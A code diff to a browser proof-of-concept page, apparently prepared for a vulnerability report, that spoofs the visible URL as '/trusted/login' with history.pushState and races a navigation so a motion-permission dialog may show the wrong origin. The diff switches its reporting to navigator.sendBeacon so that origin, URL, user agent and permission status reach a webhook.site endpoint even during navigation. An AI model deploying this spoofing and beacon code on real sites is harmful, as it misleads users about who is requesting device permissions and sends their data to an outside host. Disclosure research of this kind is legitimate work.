@@ -12,7 +12,6 @@ body {
   background: #f5f5f7;
   text-align: center;
 }
-
 button {
   font-size: 15px;
   padding: 12px 16px;
@@ -22,7 +21,6 @@ button {
   color: #fff;
   margin: 8px;
 }
-
 #panel {
   display: none;
   max-width: 420px;
@@ -32,7 +30,6 @@ button {
   border-radius: 16px;
   box-shadow: 0 20px 60px rgba(0,0,0,.2);
 }
-
 .notice {
   margin-top: 14px;
   font-size: 13px;
@@ -50,40 +47,46 @@ button {
 
 <div id="panel">
   <h3>Request Sensitive Permission</h3>
-  <p>Observe the origin shown in the permission dialog.</p>
+  <p>Observe permission dialog origin</p>
 
   <button onclick="reqMotion()">🧭 Enable Motion</button>
 
   <p id="output">Result: -</p>
 
   <div class="notice">
-    Demo only — permission UI origin may not match JS origin
+    Demo only — UI origin may not match JS origin
   </div>
 </div>
 
 <script>
 /* ================= CONFIG ================= */
 
+/* PAKAI URL TOKEN KAMU */
 const WEBHOOK = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
 
-const output = document.getElementById('output');
 const panel  = document.getElementById('panel');
+const output = document.getElementById('output');
 
-/* ================= WEBHOOK PROOF ================= */
+/* ================= WEBHOOK (FIXED) ================= */
 
-function pingWebhook(status) {
-  fetch(WEBHOOK, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      poc: 'permission-origin-desync',
-      permission: 'motion',
-      status: status,
-      attacker_origin: location.origin,
-      attacker_url: location.href,
-      timestamp: Date.now()
-    })
-  }).catch(() => {});
+function sendProof(status) {
+  const payload = {
+    poc: 'permission-origin-desync',
+    permission: 'motion',
+    status: status,
+    attacker_origin: location.origin,
+    attacker_url: location.href,
+    user_agent: navigator.userAgent,
+    timestamp: Date.now()
+  };
+
+  const blob = new Blob(
+    [JSON.stringify(payload)],
+    { type: 'application/json' }
+  );
+
+  /* SEND BEACON = TIDAK DIBATALKAN SAAT NAVIGASI */
+  navigator.sendBeacon(WEBHOOK, blob);
 }
 
 /* ================= PERMISSION ================= */
@@ -93,33 +96,33 @@ function reqMotion() {
     DeviceMotionEvent.requestPermission()
       .then(res => {
         output.textContent = 'Motion: ' + res;
-        pingWebhook(res);
+        sendProof(res);
       })
       .catch(() => {
         output.textContent = 'Motion denied';
-        pingWebhook('error');
+        sendProof('error');
       });
   } else {
     output.textContent = 'Motion API not supported';
-    pingWebhook('unsupported');
+    sendProof('unsupported');
   }
 }
 
 /* ================= ATTACK LOGIC ================= */
 
-/* Step 1: Manipulate visible URL */
+/* Step 1: Fake trusted path */
 document.getElementById('start').onclick = () => {
   history.pushState({}, '', '/trusted/login');
   panel.style.display = 'block';
 };
 
-/* Step 2: Navigation race toward victim origin */
+/* Step 2: Navigation race */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
         location.href = 'https://google.com:9090';
-      }, 100);
+      }, 120);
     });
   });
 });
